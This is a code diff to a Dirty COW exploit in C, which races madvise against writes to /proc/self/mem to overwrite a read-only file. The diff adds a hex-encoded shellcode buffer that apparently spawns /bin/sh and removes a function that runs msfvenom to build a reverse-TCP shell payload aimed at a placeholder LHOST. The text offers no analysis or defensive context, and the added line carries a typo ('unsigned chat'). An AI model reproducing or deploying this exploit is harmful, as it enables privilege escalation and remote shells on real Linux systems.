@@ -12,10 +12,11 @@ void *map;
 int f;
 struct stat st;
 char *name;
+unsigned chat buf[] = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x0f\x05";
 
 void *madviseThread(void *arg) {
     int i, c = 0;
-    for (i = 0; i < 100000000; i++) {
+    for (i = 0; i < 1000000; i++) {
         c += madvise(map, 100, MADV_DONTNEED);
     }
     printf("madvise %d\n", c);
@@ -25,18 +26,11 @@ void *procselfmemThread(void *arg) {
     char *payload = (char*)arg;
     int f = open("/proc/self/mem", O_RDWR);
     int i, c = 0;
-    for (i = 0; i < 100000000; i++) {
+    for (i = 0; i < 1000000; i++) {
         lseek(f, (uintptr_t) map, SEEK_SET);
         c += write(f, payload, strlen(payload));
     }
     printf("procselfmem %d\n", c);
-}
-
-void generate_payload() {
-    printf("[+] Generating payload with msfvenom...\n");
-    system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > payload.elf");
-    system("chmod +x payload.elf");
-    printf("[+] Payload generated: payload.elf\n");
 }
 
 int main(int argc, char *argv[]) {
@@ -45,7 +39,6 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    generate_payload();
     pthread_t pth1, pth2;
     f = open(argv[1], O_RDONLY);
     fstat(f, &st);
@@ -55,7 +48,7 @@ int main(int argc, char *argv[]) {
     printf("mmap %zx\n", (uintptr_t) map);
     
     pthread_create(&pth1, NULL, madviseThread, argv[1]);
-    pthread_create(&pth2, NULL, procselfmemThread, "payload.elf");
+    pthread_create(&pth2, NULL, procselfmemThread, buf);
     
     pthread_join(pth1, NULL);
     pthread_join(pth2, NULL);
